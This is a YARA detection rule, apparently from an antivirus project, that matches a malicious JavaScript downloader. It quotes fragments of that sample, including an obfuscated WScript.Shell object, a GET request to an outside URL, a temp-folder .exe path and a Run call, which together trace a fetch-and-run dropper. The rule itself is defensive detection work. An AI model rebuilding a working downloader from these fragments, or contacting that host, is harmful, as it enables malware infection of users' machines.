rule sig_20160328_c955ff7c8ff3b7b47a48fea84dd586a0 {
  meta:
    description = "datamaliciousorder - file 20160328_c955ff7c8ff3b7b47a48fea84dd586a0.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "f0045a08d832579844751d0af49ac5cf84381628c766cc45f9a1a7ccb39afaf8"

  strings:
    $s1  = "function Aypmjpd() {return Vegacuj[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"T7vsg7lG.exe\";};" fullword ascii
    $s2  = "Wwhlx[Fssbqy](\"GET\", \"http://www.hiveclick.com/m4usd\", false);" fullword ascii
    $s3  = "do {WScript[Siuoshcyk](Subdmej() * 11)} while (Wwhlx[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Rjhpx(Tldidhv, Tupifh){return Tldidhv - Tupifh;};" fullword ascii
    $s5  = "var Vegacuj = function Whvkak() {return WScript[Xqebkoyfnw](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Nudshhoud(Trpxscraj){Vegacuj[\"Run\"](Trpxscraj, Vweuasrqd, Vweuasrqd);};" fullword ascii
    $s7  = "function Hweqeffife() {return ((Knjnoi == true) && (Knjnoi == Gzovdj)) ? 1 : Vweuasrqd;};" fullword ascii
    $s8  = "function Glfeufz(){return Kworgatvr;};" fullword ascii
    $s9  = "var Bdylfr = new this[\"Date\"]();" fullword ascii
    $s10 = "Gzovdj = true; " fullword ascii
    $s11 = " while (Rmrhkkwg){" fullword ascii
    $s12 = "function Ywqooy(Pvxozhhk) {var Gkzlek = (1, 2, 3, 4, 5, Pvxozhhk); return Gkzlek;};" fullword ascii
    $s13 = "function Subdmej(){return 22;};" fullword ascii
    $s14 = "var Knjnoi = false;" fullword ascii
    $s15 = "return Rjhpx(Bojco, Dqfdf);" fullword ascii
    $s16 = "Knjnoi = true; " fullword ascii
    $s17 = "function Jezvgans()" fullword ascii
    $s18 = "var Gzovdj = false;" fullword ascii
    $s19 = "function Wrmpdhgmpe(){return Xqebkoyfnw;};" fullword ascii
    $s20 = "var Qransa = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}